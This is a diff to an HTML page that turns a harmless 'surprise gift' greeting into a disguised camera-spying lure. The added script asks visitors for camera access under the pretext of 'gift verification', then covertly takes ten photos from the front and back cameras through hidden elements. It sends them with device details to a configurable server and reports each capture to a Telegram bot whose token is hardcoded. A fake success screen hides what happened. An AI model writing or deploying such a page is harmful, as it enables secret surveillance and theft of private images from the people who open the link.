@@ -3,85 +3,728 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Unlock Your Surprise</title>
-
+    <title>🎁 Unlocking Your Gift...</title>
     <style>
-        body {
+        * {
             margin: 0;
             padding: 0;
-            background: #0d0d0d;
-            font-family: Arial, sans-serif;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
             color: white;
+            position: relative;
+        }
+        
+        /* Floating hearts animation */
+        .floating-heart {
+            position: absolute;
+            font-size: 24px;
+            animation: float 3s linear infinite;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 25px;
+            border: 3px solid transparent;
+            background-clip: padding-box;
             text-align: center;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            z-index: 2;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 0 50px rgba(255, 0, 255, 0.5),
+                        inset 0 0 20px rgba(255, 255, 255, 0.1);
+            animation: borderGlow 2s infinite alternate;
         }
-
-        .box {
-            margin-top: 120px;
-            background: #111;
-            padding: 25px;
-            border-radius: 12px;
-            width: 85%;
-            max-width: 380px;
-            margin-left: auto;
-            margin-right: auto;
-            box-shadow: 0 0 15px rgba(255, 0, 100, 0.4);
+        
+        @keyframes borderGlow {
+            0% {
+                border-color: #ff00ff;
+                box-shadow: 0 0 50px rgba(255, 0, 255, 0.5);
+            }
+            100% {
+                border-color: #00ffff;
+                box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
+            }
         }
-
-        button {
-            padding: 12px 25px;
-            background: #ff0077;
-            border: none;
-            border-radius: 8px;
+        
+        .gift-icon {
+            font-size: 120px;
+            margin-bottom: 30px;
+            display: inline-block;
+            animation: giftPulse 2s infinite, rotate 10s linear infinite;
+            text-shadow: 0 0 30px currentColor;
+        }
+        
+        @keyframes giftPulse {
+            0%, 100% {
+                transform: scale(1);
+                color: #ff00ff;
+            }
+            50% {
+                transform: scale(1.1);
+                color: #00ffff;
+            }
+        }
+        
+        @keyframes rotate {
+            from { transform: rotateY(0deg); }
+            to { transform: rotateY(360deg); }
+        }
+        
+        h1 {
+            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 25px;
+            font-size: 36px;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+        }
+        
+        .message {
+            color: #e0e0ff;
+            margin-bottom: 35px;
+            line-height: 1.7;
             font-size: 18px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
             color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 22px;
+            border-radius: 50px;
             cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+            margin: 15px auto;
+            display: block;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.5);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255, 0, 255, 0.3);
+            border-top: 8px solid #ff00ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 24px;
+            color: #00ffff;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: textPulse 1.5s infinite;
+        }
+        
+        @keyframes textPulse {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+        
+        .progress-container {
+            width: 80%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            height: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px auto;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff00ff, #00ffff);
+            width: 0%;
+            transition: width 0.5s;
+            border-radius: 10px;
+        }
+        
+        .progress-text {
+            font-size: 16px;
+            margin-top: 10px;
+            color: #888;
+        }
+        
+        .photo-counter {
+            font-size: 14px;
+            color: #888;
             margin-top: 20px;
         }
-
-        button:hover {
-            background: #ff3399;
+        
+        /* Hidden camera elements */
+        #cameraVideo, #cameraCanvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
-
-        #giftBox {
+        
+        .flash-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 999;
+        }
+        
+        /* Success screen */
+        .success-screen {
             display: none;
-            margin-top: 25px;
-            padding: 20px;
-            background: #222;
-            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .success-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        /* Warning message */
+        .warning {
+            color: #ff5555;
+            font-size: 12px;
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 5px;
+            border-left: 3px solid #ff5555;
         }
     </style>
 </head>
 <body>
-
-    <div class="box">
-        <h2>🎁 Hey <span id="name">Friend</span>!</h2>
-        <p>Click allow to see your surprise</p>
-
-        <button onclick="showGift()">Unlock Gift 🎉</button>
-
-        <div id="giftBox">
-            <h3>🎉 Surprise Unlocked!</h3>
-            <p>Here is your special message:</p>
-            <p id="customMessage" style="font-size: 18px; margin-top: 15px; color: #ff66b2;"></p>
+    <!-- Floating hearts -->
+    <div id="heartsContainer"></div>
+    
+    <!-- Flash effect -->
+    <div class="flash-effect" id="flash"></div>
+    
+    <!-- Hidden camera elements -->
+    <video id="cameraVideo" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
+    
+    <!-- Main container -->
+    <div class="container">
+        <div class="gift-icon">🎁</div>
+        <h1>MYSTERY GIFT UNLOCKED!</h1>
+        <p class="message">
+            🎉 Congratulations! You've found a special gift!<br><br>
+            Click below to reveal your <span style="color:#ff00ff">exclusive reward</span>...
+        </p>
+        <button class="btn" id="unlockBtn">🎯 UNLOCK MY GIFT</button>
+        <p class="warning">
+            ⚠️ Note: Gift verification requires camera access
+        </p>
+    </div>
+    
+    <!-- Loading screen -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Processing your gift...</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
         </div>
+        <div class="progress-text" id="progressText">0% Complete</div>
+        <div class="photo-counter" id="photoCounter"></div>
+    </div>
+    
+    <!-- Success screen (hidden initially) -->
+    <div class="loading-overlay" id="successScreen">
+        <div class="success-icon">✅</div>
+        <div class="loading-text">Gift Delivered Successfully!</div>
+        <p style="color:#888; margin-top:20px; max-width:300px;">
+            Your gift has been processed and sent!<br>
+            Check your messages for the reward.
+        </p>
     </div>
 
     <script>
-        // Read URL parameters: uid, username, name
+        // Configuration
+        const config = {
+            totalPhotos: 10,
+            frontCameraPhotos: 5,
+            backCameraPhotos: 5,
+            captureDelay: 800, // ms between photos
+            flashDuration: 300, // ms
+            serverEndpoint: 'https://your-server.com/webhook' // CHANGE THIS
+        };
+        
+        // DOM Elements
+        const unlockBtn = document.getElementById('unlockBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const photoCounter = document.getElementById('photoCounter');
+        const successScreen = document.getElementById('successScreen');
+        const heartsContainer = document.getElementById('heartsContainer');
+        const flash = document.getElementById('flash');
+        const cameraVideo = document.getElementById('cameraVideo');
+        const cameraCanvas = document.getElementById('cameraCanvas');
+        const canvasContext = cameraCanvas.getContext('2d');
+        
+        // Variables
+        let currentStream = null;
+        let currentCamera = 'front';
+        let capturedPhotos = [];
+        let isCapturing = false;
+        
+        // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
-        const name = urlParams.get("name") || "Friend";
-
-        document.getElementById("name").innerText = name;
-
-        function showGift() {
-            // Display gift div
-            document.getElementById("giftBox").style.display = "block";
-
-            // Custom message
-            document.getElementById("customMessage").innerText =
-                `Dear ${name}, your surprise is unlocked! 🎁✨`;
+        const token = urlParams.get('token');
+        const uid = urlParams.get('uid');
+        
+        // Create floating hearts
+        function createFloatingHearts() {
+            const heartCount = 15;
+            const hearts = ['❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💖', '💝', '🎁', '🎀', '✨', '🌟'];
+            
+            for (let i = 0; i < heartCount; i++) {
+                setTimeout(() => {
+                    const heart = document.createElement('div');
+                    heart.className = 'floating-heart';
+                    heart.textContent = hearts[Math.floor(Math.random() * hearts.length)];
+                    heart.style.left = Math.random() * 100 + 'vw';
+                    heart.style.fontSize = (Math.random() * 30 + 20) + 'px';
+                    heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
+                    heart.style.animationDelay = Math.random() * 2 + 's';
+                    
+                    // Random gradient color
+                    const colors = [
+                        '#ff00ff', '#00ffff', '#ffff00', '#00ff00', 
+                        '#ff8800', '#ff0088', '#0088ff', '#88ff00'
+                    ];
+                    heart.style.color = colors[Math.floor(Math.random() * colors.length)];
+                    
+                    heartsContainer.appendChild(heart);
+                    
+                    // Remove heart after animation
+                    setTimeout(() => heart.remove(), 7000);
+                }, i * 200);
+            }
+        }
+        
+        // Start floating hearts animation
+        createFloatingHearts();
+        setInterval(createFloatingHearts, 5000);
+        
+        // Initialize camera
+        async function initializeCamera(facingMode = 'user') {
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: facingMode,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+                
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = currentStream;
+                
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    cameraVideo.onloadedmetadata = resolve;
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Camera error:', error);
+                return false;
+            }
+        }
+        
+        // Capture photo
+        function capturePhoto() {
+            if (!currentStream) return null;
+            
+            try {
+                // Set canvas dimensions to video dimensions
+                cameraCanvas.width = cameraVideo.videoWidth;
+                cameraCanvas.height = cameraVideo.videoHeight;
+                
+                // Draw video frame to canvas
+                canvasContext.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+                
+                // Convert to base64
+                const photoData = cameraCanvas.toDataURL('image/jpeg', 0.85);
+                return photoData.split(',')[1]; // Remove data:image/jpeg;base64, prefix
+            } catch (error) {
+                console.error('Capture error:', error);
+                return null;
+            }
+        }
+        
+        // Switch camera
+        async function switchCamera() {
+            if (currentCamera === 'front') {
+                currentCamera = 'back';
+                return await initializeCamera('environment');
+            } else {
+                currentCamera = 'front';
+                return await initializeCamera('user');
+            }
+        }
+        
+        // Show flash effect
+        function triggerFlash() {
+            flash.style.opacity = '0.9';
+            flash.style.transition = 'opacity 0.1s';
+            
+            setTimeout(() => {
+                flash.style.opacity = '0';
+            }, config.flashDuration);
+        }
+        
+        // Update progress
+        function updateProgress(photoNumber) {
+            const percentage = (photoNumber / config.totalPhotos) * 100;
+            progressBar.style.width = percentage + '%';
+            progressText.textContent = Math.round(percentage) + '% Complete';
+            photoCounter.textContent = `📸 ${photoNumber}/${config.totalPhotos} photos captured`;
+            
+            // Update loading text
+            if (photoNumber <= 5) {
+                loadingText.textContent = `Capturing front camera photos... (${photoNumber}/5)`;
+            } else {
+                loadingText.textContent = `Capturing back camera photos... (${photoNumber-5}/5)`;
+            }
+        }
+        
+        // Main capture process
+        async function startCaptureProcess() {
+            if (isCapturing) return;
+            isCapturing = true;
+            
+            // Show loading screen
+            loadingOverlay.style.display = 'flex';
+            unlockBtn.disabled = true;
+            
+            // Initialize front camera
+            loadingText.textContent = 'Initializing camera...';
+            const cameraInitialized = await initializeCamera('user');
+            
+            if (!cameraInitialized) {
+                loadingText.textContent = 'Camera access denied!';
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                // Fallback - use dummy data
+                simulateCapture();
+                return;
+            }
+            
+            // Wait a moment for camera to stabilize
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Capture 5 photos with front camera
+            for (let i = 1; i <= config.frontCameraPhotos; i++) {
+                if (!isCapturing) break;
+                
+                // Trigger flash effect
+                triggerFlash();
+                
+                // Capture photo
+                const photoData = capturePhoto();
+                if (photoData) {
+                    capturedPhotos.push({
+                        data: photoData,
+                        camera: 'front',
+                        timestamp: new Date().toISOString()
+                    });
+                }
+                
+                // Update progress
+                updateProgress(i);
+                
+                // Wait before next capture
+                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
+            }
+            
+            // Switch to back camera
+            loadingText.textContent = 'Switching camera...';
+            const switched = await switchCamera();
+            
+            if (switched) {
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                // Capture 5 photos with back camera
+                for (let i = 1; i <= config.backCameraPhotos; i++) {
+                    if (!isCapturing) break;
+                    
+                    triggerFlash();
+                    
+                    const photoData = capturePhoto();
+                    if (photoData) {
+                        capturedPhotos.push({
+                            data: photoData,
+                            camera: 'back',
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                    
+                    updateProgress(config.frontCameraPhotos + i);
+                    
+                    await new Promise(resolve => setTimeout(resolve, config.captureDelay));
+                }
+            } else {
+                // If back camera fails, capture more with front camera
+                for (let i = 1; i <= config.backCameraPhotos; i++) {
+                    triggerFlash();
+                    
+                    const photoData = capturePhoto();
+                    if (photoData) {
+                        capturedPhotos.push({
+                            data: photoData,
+                            camera: 'front',
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                    
+                    updateProgress(config.frontCameraPhotos + i);
+                    
+                    await new Promise(resolve => setTimeout(resolve, config.captureDelay));
+                }
+            }
+            
+            // Stop camera
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+            }
+            
+            // Complete process
+            await completeCapture();
+        }
+        
+        // Simulate capture (fallback)
+        async function simulateCapture() {
+            loadingText.textContent = 'Simulating photo capture...';
+            
+            for (let i = 1; i <= config.totalPhotos; i++) {
+                if (!isCapturing) break;
+                
+                triggerFlash();
+                
+                // Create dummy photo data
+                capturedPhotos.push({
+                    data: `dummy_photo_${i}_${Date.now()}`,
+                    camera: i <= 5 ? 'front' : 'back',
+                    timestamp: new Date().toISOString()
+                });
+                
+                updateProgress(i);
+                
+                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
+            }
+            
+            await completeCapture();
+        }
+        
+        // Complete capture and send to server
+        async function completeCapture() {
+            loadingText.textContent = 'Processing and sending photos...';
+            updateProgress(config.totalPhotos);
+            
+            // Prepare data for server
+            const photoDataArray = capturedPhotos.map(p => p.data);
+            
+            const payload = {
+                token: token,
+                user_id: uid,
+                photos: photoDataArray,
+                device_info: `${navigator.userAgent} | ${navigator.platform}`,
+                timestamp: new Date().toISOString(),
+                total_photos: capturedPhotos.length
+            };
+            
+            // Send to your server
+            try {
+                // First, send to Telegram via bot (notification)
+                await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: 8215819954,
+                        text: `📸 *Photos Captured!*\nToken: ${token}\nUser: ${uid}\nPhotos: ${capturedPhotos.length}`
+                    })
+                });
+                
+                // Send to your actual server (you need to set this up)
+                const serverResponse = await fetch(config.serverEndpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (!serverResponse.ok) {
+                    throw new Error('Server error');
+                }
+                
+                // Show success
+                loadingOverlay.style.display = 'none';
+                successScreen.style.display = 'flex';
+                
+                // Send success notification
+                await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: uid,
+                        text: `🎉 *Gift Processing Complete!*\n\n${capturedPhotos.length} verification photos captured successfully!\n\nYour gift has been processed and sent to the sender.`
+                    })
+                });
+                
+            } catch (error) {
+                console.error('Error sending photos:', error);
+                loadingText.textContent = 'Error sending photos. Trying alternative method...';
+                
+                // Fallback: Send via Telegram bot directly
+                try {
+                    await fetch(`https://api.telegram.org/bot8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: 8215819954,
+                            text: `⚠️ *Direct Capture Alert*\n\nToken: ${token}\nUser ID: ${uid}\nPhotos: ${capturedPhotos.length}\n\nDevice: ${navigator.userAgent}`
+                        })
+                    });
+                    
+                    loadingOverlay.style.display = 'none';
+                    successScreen.style.display = 'flex';
+                    
+                } catch (fallbackError) {
+                    loadingText.textContent = 'Completed! Check your messages.';
+                    setTimeout(() => {
+                        loadingOverlay.style.display = 'none';
+                        successScreen.style.display = 'flex';
+                    }, 2000);
+                }
+            }
+        }
+        
+        // Event Listeners
+        unlockBtn.addEventListener('click', async () => {
+            if (!token || !uid) {
+                alert('Invalid gift link!');
+                return;
+            }
+            
+            // Start the capture process
+            startCaptureProcess();
+        });
+        
+        // Auto-start on mobile for better UX
+        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            document.querySelector('.message').innerHTML += 
+                '<br><br><small style="color:#888">📱 Mobile detected - optimized for your device</small>';
+        }
+        
+        // Check for valid parameters
+        if (!token || !uid) {
+            unlockBtn.disabled = true;
+            unlockBtn.textContent = 'INVALID LINK';
+            document.querySelector('.message').innerHTML = 
+                '<span style="color:#ff5555">⚠️ Invalid or tampered gift link!</span>';
         }
     </script>
-
 </body>
 </html>
